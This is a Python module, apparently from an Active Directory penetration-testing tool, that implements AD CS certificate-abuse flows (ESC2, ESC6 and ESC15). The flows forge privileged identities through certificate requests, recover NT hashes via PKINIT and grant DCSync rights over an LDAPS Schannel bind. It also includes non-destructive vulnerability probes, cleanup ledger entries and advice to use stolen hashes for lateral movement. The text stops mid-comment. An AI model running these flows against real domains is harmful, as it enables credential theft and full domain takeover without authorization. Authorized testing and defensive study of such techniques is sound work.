"""ESC2, ESC5, ESC6, ESC13, ESC15 — enrollment-based exploitation flows."""

from __future__ import annotations

from pathlib import Path
from typing import Any, Optional

from adscan_internal import telemetry
from adscan_core.rich_output import print_info, print_success, print_warning
from adscan_internal.services.adcs.cert_request import (
    CertRequestConfig,
    _CR_DISP_UNDER_SUBMISSION,
    request_certificate_native,
)
from adscan_internal.services.adcs.cert_auth import (
    CertAuthConfig,
    authenticate_with_cert_native,
)
from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
from adscan_core.rich_output import print_exception

# OID that makes a cert usable as an enrollment agent (ESC15 method B)
_ENROLLMENT_AGENT_OID = "1.3.6.1.4.1.311.20.2.1"

# OID that makes a cert usable for Schannel client authentication (ESC15 method
# A). On a schema-v1 EnrolleeSuppliesSubject template the CA honours this
# application policy supplied in the CSR, overriding the template's EKU for
# Schannel (but NOT for PKINIT — "Inconsistent Key Purpose"), so the issued cert
# authenticates over an LDAPS Schannel bind as the SAN UPN identity.
_CLIENT_AUTHENTICATION_OID = "1.3.6.1.5.5.7.3.2"

# Canary application-policy OIDs for the non-destructive ESC15 confirmation.
# Primary = Certificate Request Agent (enrollment agent): a legitimate schema-v1
# EnrolleeSuppliesSubject template certificate never carries it, so its presence
# in an issued cert is an unambiguous signal that the CA copied an injected
# application policy. The rest are fallbacks, used only when the template's own
# EKU already declares the primary (which would make the signal ambiguous).
_CONFIRM_CANARY_APPLICATION_POLICY_OIDS = (
    "1.3.6.1.4.1.311.20.2.1",  # Certificate Request Agent (enrollment agent)
    "1.3.6.1.4.1.311.10.3.4",  # Encrypting File System
    "1.3.6.1.4.1.311.10.3.12",  # Document Signing
)


def _select_confirm_canary_oid(template_eku_oids: Optional[list[str]]) -> str:
    """Pick a canary application-policy OID absent from the template's own EKU.

    The canary must be an OID the template cannot legitimately carry, so that
    finding it in the issued cert proves injection rather than a pre-existing
    EKU. Falls back through the candidate list if the primary is already in the
    template EKU, and returns the primary if (absurdly) all candidates are.
    """
    declared = {o.strip() for o in (template_eku_oids or []) if o and o.strip()}
    for oid in _CONFIRM_CANARY_APPLICATION_POLICY_OIDS:
        if oid not in declared:
            return oid
    return _CONFIRM_CANARY_APPLICATION_POLICY_OIDS[0]


def _output_dir(config: EscConfig, sub: str) -> Path:
    d = Path(config.workspace_dir or "/tmp") / "adcs" / sub
    d.mkdir(parents=True, exist_ok=True)
    return d


def _request_cfg(
    config: EscConfig,
    *,
    template: Optional[str] = None,
    upn: Optional[str] = None,
    on_behalf_of: Optional[str] = None,
    pfx_cred_path: Optional[str] = None,
    pfx_cred_pass: Optional[str] = None,
    application_policies: Optional[list[str]] = None,
) -> CertRequestConfig:
    _key_size = getattr(config, "min_key_size", None)
    return CertRequestConfig(
        domain=config.auth_domain,
        kdc_ip=config.auth_kdc,
        ca_host=config.ca_host,
        ca_name=config.ca_name,
        template=template or config.template or "",
        username=config.username,
        password=config.effective_secret,
        nt_hash=config.nt_hash,
        upn=upn,
        on_behalf_of=on_behalf_of,
        pfx_cred_path=pfx_cred_path,
        pfx_cred_pass=pfx_cred_pass,
        ca_fqdn=config.ca_fqdn,
        auth_domain=config.auth_domain,
        target_domain=config.domain,
        auth_kdc_ip=config.auth_kdc,
        target_kdc_ip=config.dc_ip,
        # Split-DC/DNS (issue #15): resolve the CA host via the separate AD DNS
        # server when configured; None -> the DC resolves (byte-identical).
        dns_server=config.dns_server,
        application_policies=application_policies,
        # Forward the workspace's fingerprinted lab provider so the cert
        # request failure panel can give lab-specific remediation hints
        # (GOAD: "vagrant up <ca_vm>") when applicable. None when the
        # operator is on a customer engagement / unknown lab.
        lab_provider=getattr(config.shell, "lab_provider", None) if config.shell is not None else None,
        # Any certificate this request obtains is a durable credential left in
        # the client's PKI, so the enrollment layer discloses it in the
        # environment-change ledger as soon as the CA issues it.
        ledger_shell=config.shell,
        ledger_domain=config.domain,
        ledger_technique=f"ADCSESC{config.esc}: certificate enrollment",
        **({} if _key_size is None else {"key_size": int(_key_size)}),
    )


async def _pkinit(
    config: EscConfig, pfx_path: Path, pfx_password: str, output_dir: Path
) -> EscResult:
    auth_cfg = CertAuthConfig(
        domain=config.domain,
        kdc_ip=config.dc_ip,
        pfx_path=pfx_path,
        pfx_password=pfx_password,
        username=config.target_upn.split("@")[0] if config.target_upn else None,
    )
    auth = await authenticate_with_cert_native(auth_cfg, output_dir)
    if not auth.success:
        if getattr(auth, "certificate_binding_refused", False):
            # The DC enforces strong certificate binding (KB5014754) and refused
            # the certificate mapping. An honest HARDENED positive control, not a
            # failed attempt — mirror the ESC15 confirm vocabulary (evidence
            # verdict "hardened"). Every enrollment ESC that converges on this
            # shared PKINIT seam inherits the honest surfacing.
            return EscResult(
                success=False,
                esc=config.esc,
                error=auth.error or "PKINIT refused by strong certificate binding",
                evidence={
                    "verdict": "hardened",
                    "certificate_binding_refused": True,
                    "reason": auth.error
                    or "the domain controller enforces strong certificate binding",
                },
            )
        return EscResult(
            success=False, esc=config.esc, error=auth.error or "PKINIT failed"
        )
    print_success(f"ESC{config.esc}: NT hash obtained")

    # Screenshot moment: ADCS ESC vulnerability confirmed exploitable end-to-end
    # (cert request -> PKINIT -> NT hash). Augments the print_success above.
    try:
        from adscan_core.rich_output_collection import (
            DiscoveryCard,
            print_discovery_card,
        )
        from adscan_core.output._state import mark_sensitive as _mark

        target_user = config.target_upn or (config.username or "principal")
        evidence_lines = [
            f"Cert issued by CA {config.ca_name or '?'} on {config.ca_host or '?'}",
            f"PKINIT to KDC {_mark(config.dc_ip or '?', 'ip')} succeeded",
        ]
        if auth.nt_hash:
            preview = (
                f"{auth.nt_hash[:8]}…{auth.nt_hash[-4:]}"
                if len(auth.nt_hash) > 12
                else auth.nt_hash
            )
            evidence_lines.append(f"NT: {_mark(preview, 'password')}")
        print_discovery_card(
            DiscoveryCard(
                severity="critical",
                headline=f"ADCS ESC{config.esc} EXPLOITED",
                target=_mark(str(target_user), "user"),
                evidence=tuple(evidence_lines),
                next_action=(
                    "Use the recovered NT hash for pass-the-hash, DCSync, or "
                    "lateral movement."
                ),
            )
        )
    except Exception as exc:  # pragma: no cover - presentation must never fail exploit
        telemetry.capture_exception(exc)
        print_exception(exception=exc)

    # Centralised compromise-event emission. Every ESC that ends in PKINIT
    # converges here, so this is the single point that:
    #   1. Stores the recovered credential in the workspace credential store.
    #   2. Emits ``user_credential_obtained`` so the attack-path orchestrator
    #      transitions the active step from ``attempted`` → ``success`` and
    #      hands the execution context off to the newly compromised user.
    # Without this, ESC handlers would each have to wire success
    # propagation manually — ESC handlers added in the future would inherit
    # the bug. Mirrors the cli/exploits.py:add_shadow_credentials path that
    # already does this for GenericAll-style compromises.
    _emit_pkinit_compromise(config, auth.nt_hash)

    return EscResult(
        success=True,
        esc=config.esc,
        nt_hash=auth.nt_hash,
        ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
        pfx_path=str(pfx_path),
    )


def _emit_pkinit_compromise(config: EscConfig, nt_hash: str | None) -> None:
    """Store the credential and signal compromise to the orchestrator.

    Called at the single PTC convergence point so every ESC that recovers an
    NT hash triggers the same downstream events: credential store update,
    context handoff, and active-step success transition.
    """
    if not nt_hash:
        return
    shell = config.shell
    if shell is None:
        return  # lab harness without a shell — nothing to register

    target_principal = (
        (config.target_upn.split("@", 1)[0] if config.target_upn else "").strip()
        or (config.on_behalf_of.split("\\", 1)[-1] if config.on_behalf_of else "").strip()
        or config.target_account
        or config.username
    )
    if not target_principal:
        return

    try:
        if hasattr(shell, "add_credential"):
            shell.add_credential(
                config.domain,
                target_principal,
                nt_hash,
                prompt_for_user_privs_after=False,
                # Per-ESC provenance slug aligned with the attack_step_catalog
                # join key (``adcsesc1``..``adcsesc17``) so credential → attack
                # step → KB is a single join. The enrollment path knows exactly
                # which ESC/template it exploited via ``config.esc``.
                credential_origin=f"adcsesc{config.esc}",
            )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)

    try:
        # Home of set_last_execution_outcome is ace_step_execution — the same
        # module backup_operators_escalation and adcs_exploitation import it
        # from. It was previously imported from attack_step_followups, which
        # does not define it, so every ESC enrolment printed an ImportError to
        # the operator and the follow-up outcome was never recorded. The
        # `no-name-in-module` suppression that came with the wrong path is
        # deliberately not carried over: it silenced the one check that would
        # have caught this.
        from adscan_internal.cli.ace_step_execution import (  # noqa: PLC0415
            set_last_execution_outcome,
        )

        set_last_execution_outcome(
            shell,
            {
                "key": "user_credential_obtained",
                "domain": config.domain,
                "target_domain": config.domain,
                "compromised_user": target_principal,
                "credential": nt_hash,
                "credential_type": "hash",
                "source_action": f"ADCSESC{config.esc}",
            },
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)

    # Transition the active attack-path step to "success" directly.  ESC
    # handlers set the edge to "attempted" before calling run_esc_sync; the
    # orchestrator's outcome-handoff machinery only fires for ACE-framework
    # steps, so ESC handlers need an explicit update here.  Using the
    # active-step updater (not update_edge_status_by_labels) ensures the
    # attack-graph-runtime log line fires and the UI reflects the correct state.
    try:
        from adscan_internal.services.attack_graph_runtime_service import (
            update_active_step_status,
        )

        update_active_step_status(
            shell,
            domain=config.domain,
            status="success",
            notes={
                "compromised_user": target_principal,
                "source_action": f"ADCSESC{config.esc}",
            },
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)


def _on_behalf_of_str(config: EscConfig) -> str:
    """Derive ``DOMAIN\\user`` string for ESC2/15 on-behalf-of phase."""
    target_user = config.on_behalf_of or (
        config.target_upn.split("@")[0]
        if "@" in config.target_upn
        else config.target_upn
    )
    if "\\" in target_user:
        return target_user
    return f"{config.domain.split('.')[0].upper()}\\{target_user}"


async def run_esc6(config: EscConfig) -> EscResult:
    """ESC6: CA has EDITF_ATTRIBUTESUBJECTALTNAME2 — request cert with arbitrary UPN."""
    out = _output_dir(config, "esc6")
    try:
        req = await request_certificate_native(
            _request_cfg(config, upn=config.target_upn), out
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(success=False, esc=6, error=str(exc))
    if not req.success:
        return EscResult(success=False, esc=6, error=req.error or "cert request failed")
    return await _pkinit(config, req.pfx_path, req.pfx_password or "", out)


async def run_esc2(config: EscConfig) -> EscResult:
    """ESC2: enroll in Any-Purpose template — use as enrollment agent — on-behalf-of."""
    out = _output_dir(config, "esc2")
    # Phase 1: obtain enrollment agent cert from the Any-Purpose template
    try:
        req1 = await request_certificate_native(_request_cfg(config), out)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(success=False, esc=2, error=str(exc))
    if not req1.success:
        return EscResult(
            success=False,
            esc=2,
            error=f"phase 1 cert request failed: {req1.error}"
            if req1.error
            else "phase 1 cert request failed",
        )

    print_info("ESC2: enrollment agent cert obtained, requesting on-behalf-of cert...")

    # Phase 2: use agent cert to enroll on behalf of target principal
    try:
        req2 = await request_certificate_native(
            _request_cfg(
                config,
                template="User",
                upn=config.target_upn,
                on_behalf_of=_on_behalf_of_str(config),
                pfx_cred_path=str(req1.pfx_path),
                pfx_cred_pass=req1.pfx_password or "",
            ),
            out,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(success=False, esc=2, error=str(exc))
    if not req2.success:
        return EscResult(
            success=False,
            esc=2,
            error=req2.error or "phase 2 on-behalf-of request failed",
        )
    return await _pkinit(config, req2.pfx_path, req2.pfx_password or "", out)


async def run_esc15(config: EscConfig) -> EscResult:
    """ESC15: inject enrollment-agent application policy OID — on-behalf-of."""
    out = _output_dir(config, "esc15")
    # Phase 1: enroll on vulnerable template with enrollment-agent app policy OID in CSR
    try:
        req1 = await request_certificate_native(
            _request_cfg(config, application_policies=[_ENROLLMENT_AGENT_OID]),
            out,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(success=False, esc=15, error=str(exc))
    if not req1.success:
        return EscResult(
            success=False,
            esc=15,
            error=f"phase 1 cert request failed: {req1.error}"
            if req1.error
            else "phase 1 cert request failed",
        )

    print_info(
        "ESC15: application-policy cert obtained, requesting on-behalf-of cert..."
    )

    # Phase 2: use that cert as enrollment agent, same as ESC2 phase 2
    try:
        req2 = await request_certificate_native(
            _request_cfg(
                config,
                template="User",
                upn=config.target_upn,
                on_behalf_of=_on_behalf_of_str(config),
                pfx_cred_path=str(req1.pfx_path),
                pfx_cred_pass=req1.pfx_password or "",
            ),
            out,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(success=False, esc=15, error=str(exc))
    if not req2.success:
        return EscResult(
            success=False,
            esc=15,
            error=req2.error or "phase 2 on-behalf-of request failed",
        )
    return await _pkinit(config, req2.pfx_path, req2.pfx_password or "", out)


async def run_esc15_schannel(config: EscConfig) -> EscResult:
    """ESC15 method A (Schannel / PassTheCert): inject Client Authentication.

    The one-certificate, one-template ESC15 route with the fewest dependencies
    (no enrollment agent, no second template). On the SAME schema-v1
    EnrolleeSuppliesSubject template it enrolls a certificate that injects the
    Client Authentication application policy OID and sets the SAN UPN to the
    privileged target, then authenticates that certificate over an **LDAPS
    Schannel bind (SASL EXTERNAL)** as the target (not PKINIT: the EKU stays
    Server Authentication, so PKINIT fails "Inconsistent Key Purpose"; the
    application-policy override applies only to Schannel). Bound as the target it
    performs the LDAP-level takeover: grant DCSync to the controlled enrolling
    principal, the canonical PassTheCert domain-takeover.

    LDAPS-only: when LDAPS is unavailable the Schannel bind cannot run, so this
    returns an honest data-gap failure and the caller falls back to method B.
    """
    out = _output_dir(config, "esc15_schannel")

    # Phase 1: enroll a client-authentication certificate for the target (SAN UPN).
    try:
        req = await request_certificate_native(
            _request_cfg(
                config,
                upn=config.target_upn,
                application_policies=[_CLIENT_AUTHENTICATION_OID],
            ),
            out,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(success=False, esc=15, error=str(exc))
    if not req.success or not req.pfx_path:
        return EscResult(
            success=False,
            esc=15,
            error=f"phase 1 cert request failed: {req.error}"
            if req.error
            else "phase 1 cert request failed",
        )

    print_info(
        "ESC15 method A: client-authentication certificate issued; binding to "
        "LDAPS over Schannel as the target identity (no PKINIT)."
    )

    # Phase 2: Schannel LDAPS bind as the target via the reusable native primitive.
    from adscan_internal.services.ldap_transport_service import (
        SchannelBindError,
        SchannelLdapsUnavailable,
        async_schannel_cert_bind,
    )

    posture_snapshot = None
    shell = config.shell
    if shell is not None:
        try:
            from adscan_internal.services.domain_posture import get_posture

            posture_snapshot = get_posture(
                getattr(shell, "domains_data", {}), domain=config.domain
            )
        except Exception:  # noqa: BLE001 — advisory only
            posture_snapshot = None

    try:
        client = await async_schannel_cert_bind(
            dc_ip=config.dc_ip,
            pfx_path=str(req.pfx_path),
            pfx_password=req.pfx_password or "",
            dc_fqdn=config.dc_fqdn,
            domain=config.domain,
            posture_snapshot=posture_snapshot,
        )
    except SchannelLdapsUnavailable as exc:
        # Method A is not possible here (LDAPS unavailable) — honest data gap so
        # the executor falls back to method B. NEVER a claim about the cert.
        return EscResult(
            success=False,
            esc=15,
            error=f"schannel_ldaps_unavailable: {exc}",
            evidence={"method": "schannel", "schannel_available": False},
        )
    except SchannelBindError as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(
            success=False,
            esc=15,
            error=f"schannel bind failed: {exc}",
            evidence={"method": "schannel", "schannel_bind_failed": True},
        )

    # Phase 3: LDAP-level takeover — grant DCSync to the controlled principal.
    try:
        takeover = await _esc15_schannel_grant_dcsync(config, client)
    finally:
        try:
            await client.disconnect()
        except Exception:  # noqa: BLE001 — best-effort teardown
            pass
    return takeover


async def _esc15_schannel_grant_dcsync(config: EscConfig, client: Any) -> EscResult:
    """Grant DCSync to the controlled enrolling principal over the Schannel client.

    Bound as the privileged target, add the GetChanges/GetChangesAll ACEs for the
    owned enrolling principal to the domain object's DACL (vendor
    ``MSLDAPClient.add_priv_dcsync``). The ACE is a durable AD change, so it is
    disclosed in the environment-change ledger with a ``manual_required``
    rollback (removing a replication ACE is done by hand / via the dacledit
    remove path, never silently left behind).
    """
    owned_user = (config.username or "").split("\\", 1)[-1].split("@", 1)[0].strip()
    if not owned_user:
        return EscResult(
            success=False,
            esc=15,
            error="ESC15 method A: no controlled principal to grant DCSync to",
            evidence={"method": "schannel"},
        )

    try:
        await client.get_ad_info()
    except Exception:  # noqa: BLE001 — add_priv_dcsync falls back to its own lookup
        pass

    owned_dn = await _resolve_dn_over_client(client, owned_user)
    if not owned_dn:
        return EscResult(
            success=False,
            esc=15,
            error=(
                "ESC15 method A: Schannel bind succeeded but the controlled "
                f"principal {owned_user!r} could not be resolved for the DCSync grant"
            ),
            evidence={"method": "schannel", "schannel_bind": "success"},
        )

    ok, err = await client.add_priv_dcsync(owned_dn)
    if not ok:
        return EscResult(
            success=False,
            esc=15,
            error=f"ESC15 method A: DCSync grant failed: {err}",
            evidence={
                "method": "schannel",
                "schannel_bind": "success",
                "takeover": "dcsync_grant_failed",
            },
        )

    # Disclose the replication-rights grant (durable ACL change on the DOMAIN
    # object's DACL) in the environment-change ledger. Removing a replication ACE
    # is not attempted automatically over the Schannel session, so it is recorded
    # as the legal-critical manual_required terminal state with the native
    # removal command the client runs.
    domain_dn = str(getattr(client, "_tree", "") or "").strip()
    try:
        from adscan_internal.services.adcs.esc_cleanup import register_ldap_change
        from adscan_internal.services.cleanup_taxonomy import (
            MANUAL_REASON_NOT_ATTEMPTED,
        )

        change_id = register_ldap_change(
            config.shell,
            kind="dacl_grant_dcsync",
            domain=config.domain,
            target=domain_dn or config.domain,
            detail={
                "right": "DCSync (DS-Replication-Get-Changes[-All])",
                "trustee": owned_user,
                "object": "domain object DACL",
                "technique": "ADCSESC15 method A (Schannel / PassTheCert)",
            },
            method="ADCSESC15 Schannel LDAPS cert bind",
        )
        ledger = getattr(config.shell, "environment_change_ledger", None)
        if ledger is not None and change_id:
            netbios = config.domain.split(".", 1)[0].upper()
            ledger.mark_manual_required(
                change_id,
                reason=MANUAL_REASON_NOT_ATTEMPTED,
                remediation_command=(
                    f'dsacls "{domain_dn or "<domain DN>"}" /R "{netbios}\\{owned_user}"'
                ),
                remediation_object_dn=domain_dn or config.domain,
                manual_cleanup_instructions=(
                    "Remove the replication (DS-Replication-Get-Changes and "
                    "DS-Replication-Get-Changes-All) access control entries granted "
                    f"to {owned_user} on the domain object, then audit the domain "
                    "DACL for any other unexpected replication grants."
                ),
            )
    except Exception as exc:  # noqa: BLE001 — disclosure is best-effort
        telemetry.capture_exception(exc)
        print_exception(exception=exc)

    print_success(
        f"ESC15 method A: DCSync granted to {owned_user} via Schannel "
        "(PassTheCert); the controlled principal can now replicate the domain."
    )
    return EscResult(
        success=True,
        esc=15,
        evidence={
            "method": "schannel",
            "schannel_bind": "success",
            "takeover": "dcsync_grant",
            "trustee": owned_user,
        },
    )


async def _resolve_dn_over_client(client: Any, sam_account_name: str) -> Optional[str]:
    """Resolve a principal's distinguishedName via a bound badldap client."""
    try:
        base_dn = getattr(client, "_tree", None) or ""
        query = f"(sAMAccountName={sam_account_name})"
        async for obj, err in client.pagedsearch(
            query, attributes=["distinguishedName"], tree=base_dn or None
        ):
            if err is not None:
                break
            if not isinstance(obj, dict):
                continue
            attrs = obj.get("attributes") if isinstance(obj.get("attributes"), dict) else obj
            dn = attrs.get("distinguishedName") or obj.get("objectName")
            if isinstance(dn, (list, tuple)):
                dn = dn[0] if dn else None
            if dn:
                return str(dn)
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
    return None


async def confirm_esc15_vulnerable(
    config: EscConfig,
    *,
    template_eku_oids: Optional[list[str]] = None,
) -> EscResult:
    """Minimal, NON-DESTRUCTIVE ESC15 / EKUwu (CVE-2024-49019) confirmation.

    Proves whether the CA honours application-policy injection WITHOUT performing
    the domain takeover. It enrolls ONE certificate for the ENROLLING USER
    THEMSELVES (subject = self: no on-behalf-of, no SAN target, no privileged
    identity) with a canary application policy injected into the CSR, then
    inspects the ISSUED certificate for that canary:

    * canary present: the CA copied the injected application policy into the
      issued cert. CONFIRMED vulnerable (unpatched), HIGH.
    * canary absent (cert issued but the policy was stripped): the CA denies
      application-policy injection. PATCHED / hardened (an observed positive).
    * request denied (disposition is not "issued"): attempted, with an honest
      reason. Never a defensive-control claim.
    * request pends (manager approval): indeterminate (data gap).

    HARD SAFETY BOUNDARY: this path NEVER mints or uses a privileged identity.
    It never calls PKINIT, cert authentication, or on-behalf-of enrollment (none
    of those are imported or invoked here). The confirmation proves CA
    exploitability; it stops at the issued certificate. The issued cert is still
    a durable credential left in the client's PKI, so disclosure + revocation
    are inherited from ``request_certificate_native`` (the ``ledger_*`` fields on
    the request config); this runner adds no second disclosure.

    Args:
        config: ESC enrollment parameters (CA, template, enrolling credential).
        template_eku_oids: The vulnerable template's declared EKU OIDs, used only
            to pick a canary the template cannot already carry. Optional.

    Returns:
        An :class:`EscResult` whose ``evidence['verdict']`` is one of
        ``confirmed_vulnerable`` / ``hardened`` / ``attempted`` / ``indeterminate``.
        ``success`` is True ONLY for ``confirmed_vulnerable``.
    """
    out = _output_dir(config, "esc15_confirm")
    canary_oid = _select_confirm_canary_oid(template_eku_oids)

    # Subject = self. ``_request_cfg`` sets CN=<user>@<auth_domain>, and we pass
    # NEITHER ``upn`` (no SAN target) NOR ``on_behalf_of`` (no agent envelope),
    # so the request carries only the enrolling user's own subject.
    req_cfg = _request_cfg(config, application_policies=[canary_oid])

    print_info(
        "ESC15 confirmation: enrolling a self-subject certificate with a canary "
        "application policy (non-destructive: no privileged identity is minted)."
    )

    try:
        req = await request_certificate_native(req_cfg, out)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(
            success=False,
            esc=15,
            error=str(exc),
            evidence={
                "verdict": "attempted",
                "confirm_only": True,
                "canary_oid": canary_oid,
                "reason": f"certificate request raised: {exc}",
            },
        )

    base_evidence = {
        "confirm_only": True,
        "canary_oid": canary_oid,
        "request_id": req.request_id,
        "disposition": req.disposition,
        "issued_eku_oids": list(req.issued_eku_oids),
        "issued_application_policy_oids": list(req.issued_application_policy_oids),
    }

    if not req.success:
        if req.disposition == _CR_DISP_UNDER_SUBMISSION:
            print_warning(
                "ESC15 confirmation indeterminate: the CA held the request for "
                "manager approval, so EKUwu can be neither confirmed nor ruled out."
            )
            return EscResult(
                success=False,
                esc=15,
                error=req.error or "request pending manager approval",
                evidence={
                    **base_evidence,
                    "verdict": "indeterminate",
                    "reason": "request pending manager approval (data gap)",
                },
            )
        print_warning(
            "ESC15 confirmation attempted: the CA did not issue the certificate."
        )
        return EscResult(
            success=False,
            esc=15,
            error=req.error or "certificate not issued",
            evidence={
                **base_evidence,
                "verdict": "attempted",
                "reason": req.error or "certificate not issued",
            },
        )

    # Issued: inspect the certificate for the canary application policy.
    if canary_oid in (req.issued_application_policy_oids or []):
        print_success(
            "ESC15 CONFIRMED (unpatched): the CA copied the injected application "
            "policy into the issued certificate (CVE-2024-49019 / EKUwu)."
        )
        return EscResult(
            success=True,
            esc=15,
            pfx_path=str(req.pfx_path) if req.pfx_path else None,
            evidence={
                **base_evidence,
                "verdict": "confirmed_vulnerable",
                "severity": "HIGH",
                "reason": (
                    "injected application-policy OID survived into the issued "
                    "certificate"
                ),
            },
        )

    print_success(
        "ESC15 not confirmed (hardened): the CA issued the certificate but "
        "stripped the injected application policy (CVE-2024-49019 patched)."
    )
    return EscResult(
        success=False,
        esc=15,
        pfx_path=str(req.pfx_path) if req.pfx_path else None,
        evidence={
            **base_evidence,
            "verdict": "hardened",
            "reason": (
                "injected application-policy OID was stripped from the issued "
                "certificate"
            ),
        },
    )


async def confirm_esc9_vulnerable(config: EscConfig) -> EscResult:
    """Minimal, NON-DESTRUCTIVE ESC9 / ESC10 behavioral canary (implicit-mapping probe).

    Proves whether the DC still honours the WEAK implicit (UPN-from-subject)
    certificate mapping a no-SID certificate relies on, WITHOUT the ESC9 takeover.
    It enrolls ONE certificate for the ENROLLING USER THEMSELVES (subject = self:
    no ``upn`` SAN target, no ``on_behalf_of`` agent envelope, no UPN swap, no
    shadow credentials, no impersonation) from the ESC9 NO_SECURITY_EXTENSION
    template, so the issued certificate carries NO SID security extension. It then
    PKINITs as self:

    * ``certificate_binding_refused`` (Kerberos error 66, KDC_ERR_CERTIFICATE_MISMATCH):
      the DC enforces strong certificate binding (KB5014754 Full) and refused the
      implicit mapping. HARDENED (an observed positive control).
    * PKINIT success: the DC honoured the implicit mapping of a no-SID certificate,
      so weak binding is confirmed present. CONFIRMED vulnerable, HIGH.
    * anything else (request denied / pending, a non-66 PKINIT failure, a clock-skew
      KDC_ERR_CLIENT_NOT_TRUSTED): indeterminate (data gap) — never a hardened or a
      defensive-control claim.

    HARD SAFETY BOUNDARY: strictly LESS invasive than the ESC9 executor
    (``run_esc9``), which plants shadow credentials on a victim, swaps its UPN and
    restores it. This canary mints and uses ONLY the enrolling principal's own
    identity (a TGT it could already obtain with its password), so it gains no
    privilege it did not already hold. The issued self certificate is the same
    durable-credential residue as the ESC15 canary, disclosed + revocable via
    ``request_certificate_native``'s ``ledger_*`` fields; this runner adds no second
    disclosure.

    Returns:
        An :class:`EscResult` whose ``evidence['verdict']`` is one of
        ``confirmed_vulnerable`` / ``hardened`` / ``indeterminate``. ``success`` is
        True ONLY for ``confirmed_vulnerable``.
    """
    out = _output_dir(config, "esc9_confirm")

    # Subject = self: NO upn (no SAN target), NO on_behalf_of (no agent envelope).
    # The template carries CT_FLAG_NO_SECURITY_EXTENSION, so the issued certificate
    # has no SID extension; with no SAN UPN the DC falls back to the implicit
    # (UPN-from-subject) mapping — exactly the mapping SCBE Full refuses.
    req_cfg = _request_cfg(config)

    print_info(
        "ESC9 confirmation: enrolling a self-subject certificate with no SID "
        "security extension and PKINIT as self (non-destructive: no shadow "
        "credentials, no UPN swap, no privileged identity is minted)."
    )

    try:
        req = await request_certificate_native(req_cfg, out)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(
            success=False,
            esc=config.esc,
            error=str(exc),
            evidence={
                "verdict": "indeterminate",
                "confirm_only": True,
                "reason": f"certificate request raised: {exc}",
            },
        )

    base_evidence = {
        "confirm_only": True,
        "request_id": req.request_id,
        "disposition": req.disposition,
    }

    if not req.success:
        if req.disposition == _CR_DISP_UNDER_SUBMISSION:
            print_warning(
                "ESC9 confirmation indeterminate: the CA held the request for "
                "manager approval, so the certificate binding can be neither "
                "confirmed nor ruled out."
            )
            return EscResult(
                success=False,
                esc=config.esc,
                error=req.error or "request pending manager approval",
                evidence={
                    **base_evidence,
                    "verdict": "indeterminate",
                    "reason": "request pending manager approval (data gap)",
                },
            )
        print_warning(
            "ESC9 confirmation attempted: the CA did not issue the certificate."
        )
        return EscResult(
            success=False,
            esc=config.esc,
            error=req.error or "certificate not issued",
            evidence={
                **base_evidence,
                "verdict": "indeterminate",
                "reason": req.error or "certificate not issued",
            },
        )

    # Issued: PKINIT as self and read the DC's certificate-binding decision.
    auth_cfg = CertAuthConfig(
        domain=config.domain,
        kdc_ip=config.dc_ip,
        pfx_path=req.pfx_path,
        pfx_password=req.pfx_password or "",
        username=config.username.split("@")[0] if config.username else None,
    )
    try:
        auth = await authenticate_with_cert_native(auth_cfg, out)
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(
            success=False,
            esc=config.esc,
            error=str(exc),
            evidence={
                **base_evidence,
                "verdict": "indeterminate",
                "reason": f"PKINIT raised: {exc}",
            },
        )

    if getattr(auth, "certificate_binding_refused", False):
        # Code 66 — the DC enforces strong certificate binding and refused the
        # implicit mapping. An honest HARDENED positive control, not a failure.
        print_success(
            "ESC9 not confirmed (hardened): the domain controller enforces strong "
            "certificate binding and refused the no-SID certificate mapping "
            "(KB5014754)."
        )
        return EscResult(
            success=False,
            esc=config.esc,
            error=auth.error,
            evidence={
                **base_evidence,
                "verdict": "hardened",
                "certificate_binding_refused": True,
                "reason": auth.error
                or (
                    "the domain controller enforces strong certificate binding "
                    "(KB5014754): a certificate with no SID extension is refused"
                ),
            },
        )

    if auth.success:
        print_success(
            "ESC9 CONFIRMED (weak binding): a self-subject certificate carrying no "
            "SID extension authenticated via the implicit mapping, so the domain "
            "controller accepts weak certificate binding."
        )
        return EscResult(
            success=True,
            esc=config.esc,
            evidence={
                **base_evidence,
                "verdict": "confirmed_vulnerable",
                "severity": "HIGH",
                "reason": (
                    "a certificate with no SID extension authenticated via the "
                    "implicit mapping, so the domain controller accepts weak "
                    "certificate binding"
                ),
            },
        )

    print_warning(
        "ESC9 confirmation indeterminate: PKINIT neither succeeded nor was refused "
        "by strong certificate binding."
    )
    return EscResult(
        success=False,
        esc=config.esc,
        error=auth.error or "PKINIT did not succeed",
        evidence={
            **base_evidence,
            "verdict": "indeterminate",
            "reason": auth.error
            or "PKINIT neither succeeded nor was refused by strong binding",
        },
    )


# ---------------------------------------------------------------------------
# ESC5 has no enrollment-based executor here. Its exploitation IS "take control
# of a CA-level object, steal the CA private key, and forge a certificate
# offline" — the CA-key-theft-and-forge chain implemented by
# `cli/adcs_exploitation.py::adcs_golden_cert` (native CA backup +
# `forge_certificate_native`). The attack-path executor dispatches `adcsesc5` to
# that working implementation directly (`cli/attack_path_execution.py`), so this
# module carries no separate, drift-prone ESC5 body.
#
# `adcsesc5` is `support_kind="supported"` in attack_step_catalog.py: the
# disclosure gate is closed. The `ca_backup.py` / `cert_forge.py` primitives now
# register four environment changes in the ledger — the exfiltrated CA private
